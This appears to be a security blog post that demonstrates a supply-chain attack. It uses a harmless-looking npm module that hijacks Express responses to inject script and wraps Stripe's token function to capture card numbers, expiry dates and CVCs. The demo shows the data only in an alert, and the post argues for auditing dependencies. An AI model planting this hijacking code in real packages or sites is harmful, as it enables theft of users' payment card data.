---
layout: post
hidden: true
permalink: stealing-credentials-with-a-malicious-node-module.html
title: Stealing credentials with a malicious node module
---

A common misconception I've seen while talking to people in the node ecosystem
is that a module's "reach" is contained to the context it is used in. This is
not the case. Every single module you import, if turned malicious, can affect
any other module that you depend on.

To demonstrate this concept, I've created the module [multiply-by-two]. This
module contains a syncronous function which returns the provided number
multiplied by two. Additionally, if you use express and Stripe, it will capture
your users' credit card details via an injected XSS attack.

<!-- Content Breaker -->

## Anatomy of an attack

In our example, we will just display the user's credit card information in an
alert dialogue. A real exploitation of this would certainly do something more
nefarious, such as POST the number, CVC, and expiry information to a remote
server that the attacker controls.

I've built a [web application] forked from [node-stripe-membership-saas], an
example repository demonstrating how to build a node application with Stripe,
which has a modified route that returns a number multiplied by two. It's not
important that it's in a route, just that the module is imported somewhere. The
malicious module looks like the following:

{% highlight javascript %}
module.exports = function(num) {
  return num * 2
}

var express = module.parent.require('express')
var original = express.response.send
var injection = function() { /* Malicious javascript */ }

express.response.send = function(content) {
  content += '<script>(' + injection.toString() + ')();</script>'
  original.bind(this)(content)
}
{% endhighlight %}

In addition to providing the multiplication function, this loads express in the
context of the parent package and wraps a core library function to inject a 
script tag into any given response. The script tag contains malicious Javascript
which is executed by the browser as an IEFE.

<img 
  src="/image/stealing-credentials-with-a-malicious-node-module/screenshot.png"
  style="border: 0; width: 90%; margin-left: 5%;"
  alt="Attack screenshot">

The payload uses a similar wrapping approach to replace the Stripe library's
token creation function. As mentioned, we just alert the user that we got their
information, but this provides full XSS capabilities. This is done with the
following:

{% highlight javascript %}
var original = Stripe.card.createToken
Stripe.card.createToken = function(opts, cb) {
  var string = 'Malicious script has grabbed the following info:\n'
  string += 'Number: ' + opts.number + '\n'
  string += 'Expiry: ' + opts.exp_month + '/' + opts.exp_year + '\n'
  string += 'CVC: ' + opts.cvc + '\n'
  alert(string)
  original(opts, cb)
}
{% endhighlight %}

## Estimating risk 

While this sort of attack is [not new], the key here is to understand that
**every single module you import, or any module that those modules import, can
put you at risk**. Do you trust all of the people who publish the modules you
import? Do you trust all the people who publish the modules imported by the
modules you import?

It's hard to gauge exactly how many people that is, so I created a tool named
[contributor-count] which gives you an idea of how many people are in the
contributor tree of a given project.

For [express], the number of trusted people is 51. For [pm2], 129. I've seen
some packages as high as 400. If any one of these users became malicious, or 
had their npm account compromised, they could perform this sort of attack
against you. Download it and see how many users your app trusts.

## Best practices

It's important to not "throw the baby out with the bath water". The node module
ecosystem allows developers to save time and effort by leveraging a massive
open source community, and we shouldn't discount the value of that. However, we
shouldn't wait for a exploit version of the left-pad problem before considering
the security implications of importing unreviewed code.

Consider looking at the number of contributors involved in a tree before using
a package, ask yourself if it makes sense to use that package at all, and be
sure to use a security tool such as [node security] so that you're aware of any
security events in your dependencies.

[pm2]: https://www.npmjs.com/package/pm2
[not new]: https://blog.liftsecurity.io/2015/01/27/a-malicious-module-on-npm/
[express]: https://www.npmjs.com/package/express
[multiply-by-two]: https://www.npmjs.com/package/multiply-by-two
[web application]: https://github.com/chrisfosterelli/node-stripe-membership-saas
[node-stripe-membership-saas]: https://github.com/eddywashere/node-stripe-membership-saas
[contributor-count]: https://www.npmjs.com/package/contributor-count
[node security]: https://nodesecurity.io/
